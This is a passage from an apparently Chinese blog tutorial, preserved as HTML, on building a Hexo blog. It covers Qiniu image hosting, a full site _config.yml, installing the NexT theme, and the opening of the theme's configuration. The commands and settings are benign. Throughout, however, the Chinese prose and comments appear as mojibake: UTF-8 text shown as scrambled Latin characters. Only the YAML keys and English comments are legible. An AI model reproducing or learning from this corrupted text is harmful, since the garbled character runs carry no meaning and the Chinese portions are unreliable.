src="http://ok44mzy2k.bkt.clouddn.com/hexo-2.png" alt="2"></p><p>Markdown æ’å…¥å›¾ç‰‡çš„è¯­æ³•ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](å›¾ç‰‡ç½‘å€)</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ å›¾ç‰‡ -&gt; è·å–å¤–é“¾ -&gt; å†™å…¥Markdownï¼Œå°±è¿™ä¹ˆç®€å•ï¼</p><p>ç”±äºä¸ƒç‰›é˜²ç›—é“¾çš„ç™½åå•æ— æ³•æ·»åŠ <code>localhost</code>ï¼Œæš‚æ—¶ä¸è®¾ç½®é˜²ç›—é“¾ï¼Œå¦åˆ™<code>hexo s</code>è°ƒè¯•çš„æ—¶å€™ï¼Œçœ‹ä¸åˆ°å›¾ç‰‡ã€‚</p><h4 id="é…ç½®åšå®¢"><a href="#é…ç½®åšå®¢" class="headerlink" title="é…ç½®åšå®¢"></a>é…ç½®åšå®¢</h4><h5 id="å…¨ç«™é…ç½®"><a href="#å…¨ç«™é…ç½®" class="headerlink" title="å…¨ç«™é…ç½®"></a>å…¨ç«™é…ç½®</h5><p><strong>æ³¨æ„ï¼šæ–‡ä»¶ä¸­é…ç½®é¡¹çš„å†’å·åé¢å¿…é¡»åŠ ç©ºæ ¼ï¼Œå¦åˆ™æŠ¥é”™</strong></p><p>ä¸‹é¢æœ‰äº›é€‰é¡¹è¦é…ç½®åæ–‡çš„æ’ä»¶æ‰æœ‰æ•ˆï¼Œæ–‡ä»¶ä¸­å·²æ³¨æ˜ã€‚</p><ul><li><strong>æ•´ç«™çš„é…ç½®</strong>ï¼šåšå®¢æ ¹ç›®å½•ä¸‹çš„<code>\_config.yml</code>æ–‡ä»¶ã€‚</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: http://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">ZEROYU</span> <span class="comment"># ç«™ç‚¹å</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="comment"># å‰¯æ ‡é¢˜</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">ä¸€åªå•çº¿ç¨‹HACKER</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">ZEROYU</span> <span class="comment"># ä½œè€…ï¼Œåœ¨ç«™ç‚¹å·¦ä¸‹è§’å¯ä»¥çœ‹åˆ°</span></span><br><span class="line"><span class="comment">#avatar: /images/avatar.jpg # å¤´åƒã€‚Nextä¸»é¢˜å¢åŠ çš„å­—æ®µ</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-Hans</span> <span class="comment"># è¯­è¨€ã€‚Nextä¸»é¢˜å¢åŠ çš„å­—æ®µ</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line"><span class="attr">since:</span> <span class="number">2015</span> <span class="comment"># åšå®¢å»ºç«‹å¹´ä»½ï¼ŒNextä¸»é¢˜å¢åŠ çš„å­—æ®µ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤šè¯´ ShortName</span></span><br><span class="line"><span class="attr">duoshuo_shortname:</span>  <span class="comment"># xxx.duoshuo.comï¼Œxxxå³æ˜¯shortnameã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Social links</span></span><br><span class="line"><span class="attr">social:</span></span><br><span class="line"><span class="attr">  Github:</span> <span class="attr">https://github.com/zer0yu</span></span><br><span class="line"><span class="attr">  Weibo:</span> <span class="attr">http://weibo.com/Z3r0yu</span></span><br><span class="line"><span class="attr">  Email:</span> <span class="string">zeroyu.xyz@gmail.com</span></span><br><span class="line">  <span class="comment"># zhihu: http://www.zhihu.com/people/your-user-name</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># title, chinese available</span></span><br><span class="line"><span class="attr">links_title:</span> <span class="string">å‹æƒ…é“¾æ¥</span></span><br><span class="line"><span class="comment"># links</span></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="string">æˆ‘çš„CSDNåšå®¢:</span> <span class="attr">http://blog.csdn.net/zeroyu_xyz</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></span><br><span class="line"><span class="attr">url:</span> <span class="attr">http://zer0yu.github.io/</span> <span class="comment"># ç½‘å€</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span>  <span class="comment"># å›½é™…åŒ–æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="attr">skip_render:</span>   <span class="comment"># è·³è¿‡æŒ‡å®šæ–‡ä»¶çš„æ¸²æŸ“</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing # æ–‡ç« å¸ƒå±€ã€å†™ä½œæ ¼å¼çš„å®šä¹‰</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="attr">external_link:</span> <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span>   <span class="comment"># 1 ä¸ºå°å†™ï¼Œ 2 ä¸ºå¤§å†™</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span>  <span class="comment"># æ˜¾ç¤ºè‰ç¨¿</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span>  <span class="comment"># å¯åŠ¨assetæ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span> <span class="comment"># é“¾æ¥æ”¹ä¸ºä¸æ ¹ç›®å½•çš„ç›¸å¯¹åœ°å€</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span>  <span class="comment"># æ˜¾ç¤ºæœªæ¥çš„æ–‡ç« </span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  line_number:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  auto_detect:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  tab_replace:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span></span><br><span class="line"><span class="attr">category_map:</span></span><br><span class="line"><span class="attr">tag_map:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="attr">HH:mm:ss</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination # æ¯é¡µæ˜¾ç¤ºæ–‡ç« æ•°</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions # è¿™é‡Œé…ç½®ç«™ç‚¹æ‰€ç”¨ä¸»é¢˜å’Œæ’ä»¶</span></span><br><span class="line"><span class="comment">## Plugins: http://hexo.io/plugins/</span></span><br><span class="line"><span class="attr">plugins:</span></span><br><span class="line"><span class="attr">baidusitemap:</span> <span class="comment"># éœ€è¦å®‰è£…æ’ä»¶ npm install hexo-generator-baidu-sitemap@0.1.1 --save</span></span><br><span class="line"><span class="attr">  path:</span> <span class="string">baidusitemap.xml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: http://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: http://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br><span class="line"></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line"><span class="attr">  type:</span> <span class="string">atom</span>       <span class="comment">#feed ç±»å‹ (atom/rss2)</span></span><br><span class="line"><span class="attr">  path:</span> <span class="string">atom.xml</span>   <span class="comment">#rss è·¯å¾„</span></span><br><span class="line"><span class="attr">  limit:</span> <span class="number">0</span>        <span class="comment">#åœ¨ rss ä¸­æœ€å¤šç”Ÿæˆçš„æ–‡ç« æ•°(0æ˜¾ç¤ºæ‰€æœ‰)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰ç«™ç‚¹å†…å®¹æœç´¢</span></span><br><span class="line"><span class="comment"># éœ€è¦å…ˆå®‰è£…æ’ä»¶ï¼š</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-search --save</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line"><span class="attr">  path:</span> <span class="string">search.xml</span></span><br><span class="line"><span class="attr">  field:</span> <span class="string">all</span>  <span class="comment"># å¦‚åªæƒ³ç´¢å¼•æ–‡ç« ï¼Œå¯è®¾ç½®ä¸ºpost</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment # ç«™ç‚¹éƒ¨ç½²åˆ°github</span></span><br><span class="line"><span class="comment">## Docs: http://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="attr">  type:</span> <span class="string">git</span></span><br><span class="line"><span class="attr">  repository:</span> <span class="string">git@github.com:zer0yu/zer0yu.github.io.git</span></span><br><span class="line"><span class="attr">  branch:</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------ä¸‹é¢é€‰é¡¹éœ€è¦å¯¹åº”æ’ä»¶çš„æ”¯æŒ---------------</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-index --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-archive --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-category --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-tag --save</span></span><br><span class="line"></span><br><span class="line"><span class="attr">index_generator:</span></span><br><span class="line"><span class="attr">  per_page:</span> <span class="number">10</span> <span class="comment">##é¦–é¡µé»˜è®¤10ç¯‡æ–‡ç« æ ‡é¢˜ å¦‚æœå€¼ä¸º0ä¸åˆ†é¡µ</span></span><br><span class="line"></span><br><span class="line"><span class="attr">archive_generator:</span></span><br><span class="line"><span class="attr">  per_page:</span> <span class="number">20</span> <span class="comment">##å½’æ¡£é¡µé¢é»˜è®¤20ç¯‡æ–‡ç« æ ‡é¢˜</span></span><br><span class="line"><span class="attr">  yearly:</span> <span class="literal">true</span>  <span class="comment">##ç”Ÿæˆå¹´è§†å›¾</span></span><br><span class="line"><span class="attr">  monthly:</span> <span class="literal">true</span> <span class="comment">##ç”Ÿæˆæœˆè§†å›¾</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tag_generator:</span></span><br><span class="line"><span class="attr">  per_page:</span> <span class="number">10</span> <span class="comment">##æ ‡ç­¾åˆ†ç±»é¡µé¢é»˜è®¤10ç¯‡æ–‡ç« </span></span><br><span class="line"></span><br><span class="line"><span class="attr">category_generator:</span></span><br><span class="line"><span class="attr">  per_page:</span> <span class="number">10</span> <span class="comment">###åˆ†ç±»é¡µé¢é»˜è®¤10ç¯‡æ–‡ç« </span></span><br></pre></td></tr></table></figure><h4 id="æ›´æ¢ä¸»é¢˜"><a href="#æ›´æ¢ä¸»é¢˜" class="headerlink" title="æ›´æ¢ä¸»é¢˜"></a>æ›´æ¢ä¸»é¢˜</h4><p>é»˜è®¤ä¸»é¢˜å¤ªä¸‘ï¼Œæ¢æˆ<a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">NexT</a>ä¸»é¢˜ã€‚</p><ul><li>å®‰è£…ï¼šåœ¨åšå®¢æ ¹ç›®å½•ä¸‹æ‰§è¡Œ<code>git clone https://github.com/iissnan/hexo-theme-next.git themes/next</code>ã€‚</li><li>å¯ç”¨ï¼šä¿®æ”¹åšå®¢æ ¹ç›®å½•ä¸‹çš„<code>_config.yml</code>é…ç½®æ–‡ä»¶ä¸­çš„<code>theme</code>å±æ€§ï¼Œå°†å…¶è®¾ç½®ä¸º<code>next</code>ã€‚</li><li>æ›´æ–°ï¼šåœ¨<code>themes/next</code>ç›®å½•ä¸‹æ‰§è¡Œ<code>git pull</code>ã€‚ï¼ˆæš‚æ—¶ä¸éœ€è¦ï¼‰</li><li><code>\themes\next\_config.yml</code>ä¿®æ”¹ä¸»é¢˜é…ç½®ã€‚</li></ul><p>æˆ‘çš„<code>_config.yml</code>æ–‡ä»¶ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Site Information Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Put your favicon.ico into `hexo-site/source/` directory.</span></span><br><span class="line"><span class="attr">favicon:</span> <span class="string">/favicon.ico</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set default keywords (Use a comma to separate)</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="string">"ZEROYU, SEC"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set rss to false to disable feed link.</span></span><br><span class="line"><span class="comment"># Leave rss as empty to use site's feed link.</span></span><br><span class="line"><span class="comment"># Set rss to specific value if you have burned your feed already.</span></span><br><span class="line"><span class="attr">rss:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify the date when the site was setup</span></span><br><span class="line"><span class="comment">#since: 2015</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># icon between year and author @Footer</span></span><br><span class="line"><span class="attr">authoricon:</span> <span class="string">heart</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Footer `powered-by` and `theme-info` copyright</span></span><br><span class="line"><span class="attr">copyright:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.</span></span><br><span class="line"><span class="comment"># See: https://support.google.com/webmasters/answer/139066</span></span><br><span class="line"><span class="comment"># Tips: Before you open this tag, remeber set up your URL in hexo _config.yml ( ex. url: http://yourdomain.com )</span></span><br><span class="line"><span class="attr">canonical:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Change headers hierarchy on site-subtitle (will be main site description) and on all post/pages titles for better SEO-optimization.</span></span><br><span class="line"><span class="attr">seo:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Menu Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># When running the site in a subdirectory (e.g. domain.tld/blog), remove the leading slash (/archives -&gt; archives)</span></span><br><span class="line"><span 